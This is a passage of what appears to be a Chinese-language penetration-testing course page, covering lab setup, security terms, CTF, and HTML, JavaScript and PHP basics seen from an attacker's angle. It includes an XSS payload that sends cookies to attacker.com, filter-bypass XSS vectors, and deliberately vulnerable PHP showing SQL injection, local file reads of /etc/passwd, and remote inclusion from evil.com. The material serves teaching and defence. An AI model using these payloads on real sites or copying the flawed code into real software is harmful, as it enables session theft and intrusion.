+</div>
+
+<div class="note warn">
+  <div class="note-lbl">重要聲明</div>
+  <p>Kali Linux 自帶 500+ 滲透工具，這些工具<strong>只應在授權的測試環境中使用</strong>。請安裝在 VMware 虛擬機中並做好快照，設置「僅主機模式」防止誤操作影響真實網路。</p>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Kali Linux — 安裝後初始化</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 更新系統（首次安裝必做）</span>
+sudo apt update <span class="op">&&</span> sudo apt upgrade <span class="op">-y</span>
+
+<span class="cm"># 確認常用工具</span>
+nmap --version
+sqlmap --version
+msfconsole --version
+
+<span class="cm"># 安裝 Docker（用於 Vulhub 靶場）</span>
+sudo apt install <span class="op">-y</span> docker.io docker-compose
+sudo systemctl enable --now docker
+
+<span class="cm"># 下載 Vulhub 靶場</span>
+git clone https://github.com/vulhub/vulhub.git
+
+<span class="cm"># 啟動任意靶場（以 Apache Log4j 為例）</span>
+cd vulhub/log4j/CVE-2021-44228
+docker-compose up <span class="op">-d</span>
+
+<span class="cm"># 一行啟動 DVWA 靶場</span>
+docker run <span class="op">-d -p 80:80</span> --name dvwa vulnerables/web-dvwa
+<span class="cm"># 訪問 http://localhost/setup.php → 預設帳號 admin / password</span></pre>
+</div>
+</div>
+
+<!-- ===== L1-5 術語 ===== -->
+<div class="cb" id="l1-5">
+<h2>滲透測試專業術語速查</h2>
+<p>掌握這些術語是看懂滲透測試報告、參與技術討論的前提。後面的課程中這些詞彙會反覆出現。</p>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>術語</th><th>英文</th><th>解釋</th></tr></thead>
+    <tbody>
+      <tr><td><strong>滲透測試</strong></td><td>Penetration Testing</td><td>在授權範圍內模擬攻擊者，找出系統安全漏洞的過程</td></tr>
+      <tr><td><strong>Webshell</strong></td><td>Webshell</td><td>上傳到 Web 伺服器的惡意腳本，提供遠端命令執行能力</td></tr>
+      <tr><td><strong>提權</strong></td><td>Privilege Escalation</td><td>從低權限用戶提升到 root/SYSTEM 的過程</td></tr>
+      <tr><td><strong>橫向移動</strong></td><td>Lateral Movement</td><td>在內網中從一台被攻陷的機器移動到其他機器</td></tr>
+      <tr><td><strong>反彈 Shell</strong></td><td>Reverse Shell</td><td>目標機器主動連回攻擊者，建立命令執行通道</td></tr>
+      <tr><td><strong>C2 / C&amp;C</strong></td><td>Command &amp; Control</td><td>攻擊者用於遠端控制被感染機器的服務器</td></tr>
+      <tr><td><strong>Payload</strong></td><td>Payload</td><td>漏洞利用時執行的惡意代碼，如反彈 Shell 的代碼</td></tr>
+      <tr><td><strong>0day / 1day</strong></td><td>Zero-day / One-day</td><td>0day：廠商未知的漏洞；1day：已有補丁但未廣泛修復的漏洞</td></tr>
+      <tr><td><strong>PoC / EXP</strong></td><td>Proof of Concept / Exploit</td><td>PoC 證明漏洞存在；EXP 可直接利用漏洞獲取權限</td></tr>
+      <tr><td><strong>WAF</strong></td><td>Web Application Firewall</td><td>Web 應用防火牆，攔截惡意 HTTP 請求</td></tr>
+      <tr><td><strong>情報收集</strong></td><td>Reconnaissance / Recon</td><td>滲透前收集目標信息（IP、域名、技術棧、人員等）</td></tr>
+      <tr><td><strong>APT</strong></td><td>Advanced Persistent Threat</td><td>持續性、有組織、有針對性的高級攻擊</td></tr>
+      <tr><td><strong>IOC</strong></td><td>Indicator of Compromise</td><td>入侵指標，用於識別攻擊的特徵（IP、Hash、域名等）</td></tr>
+      <tr><td><strong>GetShell</strong></td><td>—</td><td>取得目標伺服器的命令執行權限（Webshell 或反彈 Shell）</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+<!-- ===== L1-6 CTF 護網 ===== -->
+<div class="cb" id="l1-6">
+<h2>CTF、護網行動與漏洞庫</h2>
+
+<h3>CTF（Capture The Flag）</h3>
+<p>CTF 是一種資安競賽形式，參賽者透過解決安全挑戰獲取「Flag」（特定格式的字符串）。CTF 是學習和驗證技術能力的重要途徑，也是建立個人技術名聲的方式。</p>
+<div class="kg">
+  <div class="kt"><div class="kt-n">Jeopardy（解題模式）</div><div class="kt-d">最常見的 CTF 形式。各題目獨立，解出即得分。題型：Web、Pwn（二進制）、Reverse（逆向）、Crypto（密碼學）、Misc（雜項）。</div></div>
+  <div class="kt"><div class="kt-n">Attack-Defense（攻防模式）</div><div class="kt-d">每個隊伍同時作為攻擊方和防守方，在保護自身服務的同時攻擊其他隊伍，更接近真實攻防場景。</div></div>
+  <div class="kt"><div class="kt-n">國內練習平台</div><div class="kt-d">BUUCTF、攻防世界（xctf.org.cn）、Bugku、NSSCTF、CTFHub——推薦從 Web 類題目入手。</div></div>
+  <div class="kt"><div class="kt-n">國際平台</div><div class="kt-d">CTFtime.org（賽事日曆）、PicoCTF（初學者友好）、pwn.college（系統安全深度學習）。</div></div>
+</div>
+
+<h3>護網行動（HW / 攻防演練）</h3>
+<p>護網行動是國家組織的大規模攻防演練，每年定期舉行。企業（藍隊/防守方）需保護系統，授權的攻擊隊（紅隊）進行真實攻擊測試。護網期間資安人才需求激增。</p>
+<div class="note tip">
+  <div class="note-lbl">護網崗位</div>
+  <p><strong>藍隊（防守）：</strong>安全監控、告警分析、應急響應、溯源反制。需熟悉安全設備（WAF/IDS/IPS）操作和日誌分析。<br>
+  <strong>紅隊（攻擊）：</strong>需通過資質審查，使用真實攻擊技術對授權目標進行測試，需豐富的滲透經驗。</p>
+</div>
+
+<h3>主要漏洞庫對比</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>漏洞庫</th><th>全名</th><th>特點</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">CVE</td><td>Common Vulnerabilities and Exposures</td><td>國際標準漏洞編號，格式：CVE-年份-序號（如 CVE-2021-44228）</td></tr>
+      <tr><td class="mc">NVD</td><td>National Vulnerability Database</td><td>美國 NIST 維護，包含 CVSS 評分（0-10 分），比 CVE 更詳細</td></tr>
+      <tr><td class="mc">CNVD</td><td>中國國家信息安全漏洞共享平台</td><td>可提交漏洞獲取積分和獎勵，國內廠商漏洞首選披露渠道</td></tr>
+      <tr><td class="mc">CNNVD</td><td>中國國家信息安全漏洞庫</td><td>工信部維護，收錄國內外漏洞，是等保合規的官方參考</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+
+<!-- ===== CH2: HTML/JS ===== -->
+
+<!-- L2-1 為什麼學 HTML -->
+<div class="cb" id="l2-1">
+<h2>為什麼資安工程師要學 HTML？</h2>
+<p>很多初學者疑惑：「我是要學滲透測試的，為什麼要學前端開發？」答案很簡單：<strong>你無法攻擊你不理解的東西。</strong></p>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>XSS 攻擊的基礎</strong> — XSS（跨站腳本攻擊）本質上是在 HTML 頁面中注入惡意 JavaScript。不懂 HTML 結構和 JS 執行機制，就無法理解為什麼 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 能彈窗，更別說繞過 WAF 過濾了。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>表單與參數分析</strong> — 所有 Web 漏洞（SQL 注入、CSRF、邏輯漏洞等）都涉及 HTTP 請求參數。理解 HTML 表單如何構造請求，能快速識別所有輸入點。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>閱讀頁面源代碼</strong> — 信息收集階段，查看網頁源代碼（View Source / Ctrl+U）可以發現隱藏參數、注釋中的敏感信息、使用的 JS 框架和版本等。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>釣魚頁面與社工攻擊</strong> — 製作仿冒真實網站的釣魚頁面需要基礎的 HTML/CSS 能力。這也是為什麼理解前端能幫助你識別和防禦釣魚攻擊。</div></div>
+</div>
+<div class="note tip">
+  <div class="note-lbl">學習目標</div>
+  <p>本章節的目標不是讓你成為前端工程師，而是達到「能讀懂 HTML/JS 代碼，理解基本結構，識別潛在安全問題」的水準。實際滲透時你不需要自己寫頁面，但需要能分析和修改已有代碼。</p>
+</div>
+</div>
+
+<!-- L2-2 HTML 標籤 -->
+<div class="cb" id="l2-2">
+<h2>HTML 標籤、元素與表單</h2>
+<p>HTML（HyperText Markup Language）使用標籤（Tag）描述網頁結構。每個標籤由 <code>&lt;開始標籤&gt;</code>、內容、<code>&lt;/結束標籤&gt;</code> 組成。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">HTML — 基礎結構</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">&lt;!-- HTML 基礎結構 --&gt;</span>
+<span class="op">&lt;!</span><span class="tg">DOCTYPE</span> <span class="at">html</span><span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="tg">html</span> <span class="at">lang</span>=<span class="vl">"zh-TW"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="tg">head</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">meta</span> <span class="at">charset</span>=<span class="vl">"UTF-8"</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">title</span><span class="op">&gt;</span>頁面標題<span class="op">&lt;/</span><span class="tg">title</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">head</span><span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="tg">body</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">h1</span><span class="op">&gt;</span>標題<span class="op">&lt;/</span><span class="tg">h1</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">p</span><span class="op">&gt;</span>段落文字<span class="op">&lt;/</span><span class="tg">p</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">a</span> <span class="at">href</span>=<span class="vl">"https://example.com"</span><span class="op">&gt;</span>超連結<span class="op">&lt;/</span><span class="tg">a</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">img</span> <span class="at">src</span>=<span class="vl">"image.jpg"</span> <span class="at">alt</span>=<span class="vl">"圖片描述"</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">div</span> <span class="at">id</span>=<span class="vl">"container"</span> <span class="at">class</span>=<span class="vl">"box"</span><span class="op">&gt;</span>區塊容器<span class="op">&lt;/</span><span class="tg">div</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">body</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">html</span><span class="op">&gt;</span></pre>
+</div>
+
+<h3>HTML 表單（資安核心關注點）</h3>
+<p>表單是 Web 應用接收用戶輸入的主要方式，也是絕大多數 Web 漏洞的入口點。每個 <code>&lt;input&gt;</code> 字段都是潛在的注入點。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">HTML 表單 — 資安分析視角</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;</span><span class="tg">form</span> <span class="at">action</span>=<span class="vl">"/login"</span> <span class="at">method</span>=<span class="vl">"POST"</span><span class="op">&gt;</span>
+
+  <span class="cm">&lt;!-- text：明文輸入，直接注入點 --&gt;</span>
+  <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"text"</span>     <span class="at">name</span>=<span class="vl">"username"</span><span class="op">&gt;</span>
+
+  <span class="cm">&lt;!-- password：介面不顯示明文，但 Burp Suite 抓包完全可見 --&gt;</span>
+  <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"password"</span> <span class="at">name</span>=<span class="vl">"password"</span><span class="op">&gt;</span>
+
+  <span class="cm">&lt;!-- hidden：用戶看不到，但用 Burp 攔截後可任意修改！漏洞高發區 --&gt;</span>
+  <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"hidden"</span>   <span class="at">name</span>=<span class="vl">"role"</span> <span class="at">value</span>=<span class="vl">"user"</span><span class="op">&gt;</span>
+
+  <span class="cm">&lt;!-- file：文件上傳漏洞的入口 --&gt;</span>
+  <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"file"</span>     <span class="at">name</span>=<span class="vl">"avatar"</span><span class="op">&gt;</span>
+
+  <span class="cm">&lt;!-- select：下拉選單，前端限制可被 Burp 繞過 --&gt;</span>
+  <span class="op">&lt;</span><span class="tg">select</span> <span class="at">name</span>=<span class="vl">"dept"</span><span class="op">&gt;</span>
+    <span class="op">&lt;</span><span class="tg">option</span> <span class="at">value</span>=<span class="vl">"1"</span><span class="op">&gt;</span>技術部<span class="op">&lt;/</span><span class="tg">option</span><span class="op">&gt;</span>
+    <span class="op">&lt;</span><span class="tg">option</span> <span class="at">value</span>=<span class="vl">"2"</span><span class="op">&gt;</span>人事部<span class="op">&lt;/</span><span class="tg">option</span><span class="op">&gt;</span>
+  <span class="op">&lt;/</span><span class="tg">select</span><span class="op">&gt;</span>
+
+  <span class="op">&lt;</span><span class="tg">button</span> <span class="at">type</span>=<span class="vl">"submit"</span><span class="op">&gt;</span>登入<span class="op">&lt;/</span><span class="tg">button</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">form</span><span class="op">&gt;</span></pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">資安視角：hidden 字段的陷阱</div>
+  <p><code>type="hidden"</code> 的字段對普通用戶不可見，但使用 Burp Suite 攔截請求後可以任意修改。如果後端直接信任這個字段（如把 <code>role=admin</code> 當作權限依據），就會產生越權漏洞。<strong>永遠不要在客戶端做安全決策，所有驗證必須在服務端進行。</strong></p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">一個登入表單使用了 <code>&lt;input type="hidden" name="is_admin" value="0"&gt;</code>，後端直接讀取這個值判斷管理員權限。這個設計存在什麼安全問題？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>沒有問題，hidden 字段用戶看不到</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>用戶可以用 Burp Suite 攔截並修改這個字段為 1，獲得管理員權限</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>問題在於應該使用 GET 方法而非 POST</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>問題在於沒有使用 HTTPS</div>
+  </div>
+  <div class="q-exp">正確！這是「參數篡改」漏洞。雖然 hidden 字段在瀏覽器介面不可見，但使用 Burp Suite 攔截 HTTP 請求後，可以輕易修改任何請求參數。攻擊者只需將 is_admin=0 改為 is_admin=1 提交，就能獲取管理員權限。正確做法：權限驗證必須在服務端基於 Session/Token 進行，不能信任任何來自客戶端的輸入。</div>
+</div>
+</div>
+
+<!-- L2-3 JS 基礎 -->
+<div class="cb" id="l2-3">
+<h2>JavaScript 基礎語法</h2>
+<p>JavaScript 是 Web 的「行為層」，讓頁面具有動態交互能力。從資安角度，理解 JS 是分析 XSS 攻擊、繞過前端校驗、分析混淆代碼的基礎。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">JavaScript — 基礎語法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 變數宣告 ───</span>
+<span class="kw">var</span>   x  = <span class="nu">10</span>;      <span class="cm">// 函數作用域（舊式，避免使用）</span>
+<span class="kw">let</span>   y  = <span class="nu">20</span>;      <span class="cm">// 塊作用域（推薦）</span>
+<span class="kw">const</span> PI = <span class="nu">3.14</span>;   <span class="cm">// 常數，不可重新賦值</span>
+
+<span class="cm">// ─── 資料類型 ───</span>
+<span class="kw">let</span> str  = <span class="st">"Hello"</span>;            <span class="cm">// 字串</span>
+<span class="kw">let</span> num  = <span class="nu">42</span>;                  <span class="cm">// 數字</span>
+<span class="kw">let</span> bool = <span class="kw">true</span>;               <span class="cm">// 布林</span>
+<span class="kw">let</span> arr  = [<span class="nu">1</span>, <span class="nu">2</span>, <span class="nu">3</span>];           <span class="cm">// 陣列</span>
+<span class="kw">let</span> obj  = { name: <span class="st">"Alice"</span>, age: <span class="nu">25</span> }; <span class="cm">// 物件</span>
+
+<span class="cm">// ─── 函數 ───</span>
+<span class="kw">function</span> <span class="fn">add</span>(a, b) { <span class="kw">return</span> a + b; }
+<span class="kw">const</span> <span class="fn">square</span> = n => n * n;     <span class="cm">// 箭頭函數</span>
+
+<span class="cm">// ─── DOM 操作（XSS 攻擊的核心）───</span>
+document.<span class="fn">getElementById</span>(<span class="st">'id'</span>).innerHTML = <span class="st">'&lt;b&gt;修改DOM&lt;/b&gt;'</span>;
+document.cookie;                        <span class="cm">// 讀取全部 Cookie → XSS 竊取目標</span>
+document.location = <span class="st">'http://evil.com'</span>; <span class="cm">// 重定向 → 釣魚攻擊</span>
+
+<span class="cm">// ─── 常見 XSS Payload 解析 ───</span>
+<span class="cm">// 方法1：彈窗（驗證 XSS 是否存在）</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(<span class="st">'XSS'</span>)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// 方法2：Cookie 竊取（最常用）</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>
+  <span class="kw">new</span> Image().src = <span class="st">'http://attacker.com/steal?c='</span> + document.cookie;
+<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// 方法3：繞過標籤過濾的 XSS</span>
+<span class="op">&lt;</span>img src=x onerror=<span class="st">"alert(1)"</span><span class="op">&gt;</span>
+<span class="op">&lt;</span>svg onload=<span class="st">"alert(1)"</span><span class="op">&gt;</span></pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">XSS 攻擊鏈</div>
+  <p>完整的 XSS Cookie 竊取流程：<br>
+  1. 攻擊者在存儲型 XSS 漏洞處注入惡意 JS → 2. 受害者訪問含惡意 JS 的頁面 → 3. 受害者瀏覽器執行 JS，讀取 document.cookie → 4. Cookie 被發送到攻擊者的服務器 → 5. 攻擊者用竊取的 Session Cookie 登入受害者帳號（Session 劫持）</p>
+</div>
+</div>
+
+<!-- L2-4 流程控制 -->
+<div class="cb" id="l2-4">
+<h2>JavaScript 流程控制與事件處理</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">JavaScript — 流程控制與前端驗證繞過</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 條件判斷 ───</span>
+<span class="kw">if</span> (age >= <span class="nu">18</span>) {
+  console.<span class="fn">log</span>(<span class="st">"成年"</span>);
+} <span class="kw">else</span> {
+  console.<span class="fn">log</span>(<span class="st">"未成年"</span>);
+}
+
+<span class="cm">// ─── 迴圈 ───</span>
+<span class="kw">for</span> (<span class="kw">let</span> i = <span class="nu">0</span>; i < <span class="nu">5</span>; i++) { console.<span class="fn">log</span>(i); }
+arr.<span class="fn">forEach</span>(item => console.<span class="fn">log</span>(item));
+
+<span class="cm">// ─── 事件監聽 ───</span>
+document.<span class="fn">getElementById</span>(<span class="st">'btn'</span>).<span class="fn">addEventListener</span>(<span class="st">'click'</span>, <span class="kw">function</span>() {
+  alert(<span class="st">'被點擊了'</span>);
+});
+
+<span class="cm">// ─── 前端驗證（不安全！可被 Burp 輕鬆繞過）───</span>
+<span class="kw">function</span> <span class="fn">validateForm</span>() {
+  <span class="kw">let</span> input = document.<span class="fn">getElementById</span>(<span class="st">'search'</span>).value;
+  <span class="cm">// 前端過濾特殊字符 → 只需用 Burp 攔截後修改，完全無效</span>
+  <span class="kw">if</span> (input.<span class="fn">includes</span>(<span class="st">"'"</span>) || input.<span class="fn">includes</span>(<span class="st">"&lt;"</span>)) {
+    alert(<span class="st">"輸入不合法"</span>);
+    <span class="kw">return</span> <span class="kw">false</span>; <span class="cm">// ← 攻擊者根本不會通過瀏覽器提交！</span>
+  }
+}</pre>
+</div>
+
+<div class="note warn">
+  <div class="note-lbl">前端驗證只是 UI 體驗，不是安全機制</div>
+  <p>很多開發者以為在前端用 JavaScript 做了輸入驗證（如禁止特殊字符）就安全了。但攻擊者只需用 Burp Suite 攔截請求，在數據發送到服務端之前直接修改 HTTP 請求，完全繞過前端 JS 驗證。<strong>所有安全驗證必須在服務端進行。前端驗證只是改善用戶體驗，永遠不是安全防線。</strong></p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">以下哪個 JavaScript 代碼片段是 XSS 攻擊中最常見的 Cookie 竊取 Payload？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span><code>alert(document.title)</code></div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span><code>new Image().src='http://attacker.com/?c='+document.cookie</code></div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span><code>console.log(window.location)</code></div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span><code>document.write('XSS')</code></div>
+  </div>
+  <div class="q-exp">正確！這是 XSS Cookie 竊取的經典手法：利用 new Image().src 發起一個看不見的跨域 GET 請求，將 document.cookie 的值作為 URL 參數發送到攻擊者伺服器。攻擊者查看伺服器日誌即可獲取受害者 Cookie，進而進行 Session 劫持。A 只是彈窗無害，C 只是輸出 URL，D 修改頁面但無法竊取數據。</div>
+</div>
+</div>
+
+
+<!-- ===== CH3: PHP ===== -->
+
+<!-- L3-1 PHP 環境與語法 -->
+<div class="cb" id="l3-1">
+<h2>PHP 環境搭建與基本語法</h2>
+<p>PHP 是驅動全球超過 75% 動態網站的服務端語言（包括 WordPress、Drupal、Laravel 等）。理解 PHP 語法是分析 PHP Web 漏洞（SQL 注入、文件包含、命令注入等）的必要基礎。</p>
+
+<h3>快速搭建 PHP 環境</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP 環境搭建</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 方法1：Docker 快速啟動（推薦）</span>
+docker run -d -p 80:80 -v /var/www/html:/var/www/html php:8.1-apache
+
+<span class="cm"># 方法2：CentOS 安裝 LAMP</span>
+yum install -y httpd php php-mysqli mariadb-server
+systemctl enable --now httpd mariadb
+
+<span class="cm"># 測試 PHP 是否正常</span>
+echo '&lt;?php phpinfo(); ?&gt;' > /var/www/html/info.php
+<span class="cm"># 訪問 http://localhost/info.php 看到 PHP 版本頁即成功</span>
+
+<span class="cm"># 注意：phpinfo() 洩露大量系統信息，生產環境必須刪除！</span></pre>
+</div>
+
+<h3>PHP 基本語法</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP — 基礎語法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── 變數（以 $ 開頭）───</span>
+<span class="sl">$name</span>  = <span class="st">"Alice"</span>;
+<span class="sl">$age</span>   = <span class="nu">25</span>;
+<span class="sl">$price</span> = <span class="nu">9.99</span>;
+<span class="sl">$flag</span>  = <span class="kw">true</span>;
+
+<span class="cm">// ─── 輸出 ───</span>
+<span class="kw">echo</span> <span class="st">"Hello, "</span> . <span class="sl">$name</span>;   <span class="cm">// . 是字串連接符</span>
+<span class="fn">print_r</span>(<span class="sl">$arr</span>);             <span class="cm">// 印出陣列（調試用）</span>
+<span class="fn">var_dump</span>(<span class="sl">$var</span>);            <span class="cm">// 印出類型和值</span>
+
+<span class="cm">// ─── 超全局變數（資安最重要的部分！）───</span>
+<span class="sl">$_GET</span>     <span class="cm">// URL 參數：?name=Alice&id=1</span>
+<span class="sl">$_POST</span>    <span class="cm">// POST 表單數據</span>
+<span class="sl">$_REQUEST</span> <span class="cm">// GET + POST + COOKIE 的合集（危險！）</span>
+<span class="sl">$_COOKIE</span>  <span class="cm">// Cookie 數據</span>
+<span class="sl">$_SESSION</span> <span class="cm">// Session 數據（服務端存儲）</span>
+<span class="sl">$_FILES</span>   <span class="cm">// 上傳的文件信息</span>
+<span class="sl">$_SERVER</span>  <span class="cm">// 伺服器環境（IP、User-Agent、請求路徑等）</span>
+
+<span class="cm">// ─── 典型的 SQL 注入漏洞代碼（危！）───</span>
+<span class="sl">$id</span>    = <span class="sl">$_GET</span>[<span class="st">'id'</span>];  <span class="cm">// 直接接收用戶輸入</span>
+<span class="sl">$query</span> = <span class="st">"SELECT * FROM users WHERE id = $id"</span>;
+<span class="cm">// 若 id=1 OR 1=1 則查詢返回所有用戶！</span>
+<span class="op">?&gt;</span></pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">代碼審計核心：追蹤超全局變數的數據流</div>
+  <p><code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code> 是所有 Web 漏洞的入口。進行代碼審計時，追蹤這些變數的數據流是發現漏洞的核心方法。關鍵問題：<br>
+  1. 這個變數有沒有被過濾？<br>
+  2. 過濾是否有效（有沒有繞過方式）？<br>
+  3. 最終傳入了什麼危險函數（mysql_query、exec、include 等）？</p>
+</div>
+</div>
+
+<!-- L3-2 流程控制 -->
+<div class="cb" id="l3-2">
+<h2>PHP 流程控制與函數</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP — 流程控制與函數</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── 條件判斷 ───</span>
+<span class="sl">$score</span> = <span class="nu">85</span>;
+<span class="kw">if</span> (<span class="sl">$score</span> >= <span class="nu">90</span>) {
+    <span class="kw">echo</span> <span class="st">"優秀"</span>;
+} <span class="kw">elseif</span> (<span class="sl">$score</span> >= <span class="nu">60</span>) {
+    <span class="kw">echo</span> <span class="st">"及格"</span>;
+} <span class="kw">else</span> {
+    <span class="kw">echo</span> <span class="st">"不及格"</span>;
+}
+
+<span class="cm">// ─── switch-case ───</span>
+<span class="kw">switch</span> (<span class="sl">$_GET</span>[<span class="st">'action'</span>]) {
+    <span class="kw">case</span> <span class="st">'login'</span>:  <span class="fn">doLogin</span>();  <span class="kw">break</span>;
+    <span class="kw">case</span> <span class="st">'logout'</span>: <span class="fn">doLogout</span>(); <span class="kw">break</span>;
+    <span class="kw">default</span>:       <span class="kw">echo</span> <span class="st">"未知操作"</span>;
+}
+
+<span class="cm">// ─── 迴圈 ───</span>
+<span class="kw">for</span> (<span class="sl">$i</span> = <span class="nu">0</span>; <span class="sl">$i</span> < <span class="nu">10</span>; <span class="sl">$i</span>++) { <span class="kw">echo</span> <span class="sl">$i</span>; }
+<span class="kw">foreach</span> (<span class="sl">$arr</span> <span class="kw">as</span> <span class="sl">$key</span> => <span class="sl">$value</span>) { <span class="kw">echo</span> <span class="st">"$key: $value"</span>; }
+
+<span class="cm">// ─── 自定義函數 ───</span>
+<span class="kw">function</span> <span class="fn">safeInput</span>(<span class="sl">$str</span>) {
+    <span class="sl">$str</span> = <span class="fn">trim</span>(<span class="sl">$str</span>);           <span class="cm">// 去除首尾空格</span>
+    <span class="sl">$str</span> = <span class="fn">htmlspecialchars</span>(<span class="sl">$str</span>); <span class="cm">// HTML 實體編碼（防 XSS）</span>
+    <span class="sl">$str</span> = <span class="fn">addslashes</span>(<span class="sl">$str</span>);    <span class="cm">// 添加反斜線（不夠用，要用 PDO！）</span>
+    <span class="kw">return</span> <span class="sl">$str</span>;
+}
+<span class="op">?&gt;</span></pre>
+</div>
+</div>
+
+<!-- L3-3 陣列正則文件 -->
+<div class="cb" id="l3-3">
+<h2>PHP 陣列、正則表達式、文件操作</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP — 陣列與文件操作</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── 陣列 ───</span>
+<span class="sl">$fruits</span> = [<span class="st">"apple"</span>, <span class="st">"banana"</span>, <span class="st">"cherry"</span>];
+<span class="sl">$user</span>   = [<span class="st">"name"</span> => <span class="st">"Alice"</span>, <span class="st">"age"</span> => <span class="nu">25</span>]; <span class="cm">// 關聯陣列</span>
+<span class="fn">count</span>(<span class="sl">$fruits</span>);         <span class="cm">// 陣列長度</span>
+<span class="fn">in_array</span>(<span class="st">"apple"</span>, <span class="sl">$fruits</span>); <span class="cm">// 是否包含某值</span>
+
+<span class="cm">// ─── 正則表達式（輸入驗證常用）───</span>
+<span class="cm">// preg_match：用正則驗證輸入（白名單過濾思維）</span>
+<span class="kw">if</span> (!<span class="fn">preg_match</span>(<span class="st">'/^[a-zA-Z0-9]+$/'</span>, <span class="sl">$_GET</span>[<span class="st">'name'</span>])) {
+    <span class="kw">die</span>(<span class="st">"非法字符"</span>);
+}
+<span class="cm">// preg_replace：替換匹配內容</span>
+<span class="sl">$clean</span> = <span class="fn">preg_replace</span>(<span class="st">'/[&lt;&gt;]/'</span>, <span class="st">''</span>, <span class="sl">$input</span>);
+
+<span class="cm">// ─── 文件操作（文件包含漏洞的根源）───</span>
+<span class="sl">$content</span> = <span class="fn">file_get_contents</span>(<span class="st">'/etc/passwd'</span>);   <span class="cm">// 讀文件</span>
+<span class="fn">file_put_contents</span>(<span class="st">'log.txt'</span>, <span class="sl">$data</span>, FILE_APPEND); <span class="cm">// 追加寫文件</span>
+
+<span class="cm">// ─── 危險：文件包含（Local File Inclusion）───</span>
+<span class="sl">$page</span> = <span class="sl">$_GET</span>[<span class="st">'page'</span>];
+<span class="kw">include</span>(<span class="sl">$page</span>);  <span class="cm">// ?page=../../../../etc/passwd 可讀取系統文件！</span>
+                 <span class="cm">// ?page=http://evil.com/shell.php 可遠端代碼執行！</span>
+<span class="op">?&gt;</span></pre>
+</div>
+
+<div class="note danger">
+  <div class="note-lbl">文件包含漏洞（LFI / RFI）</div>
+  <p>當 <code>include</code>/<code>require</code> 的參數來自用戶輸入且未過濾時，產生文件包含漏洞。<br>
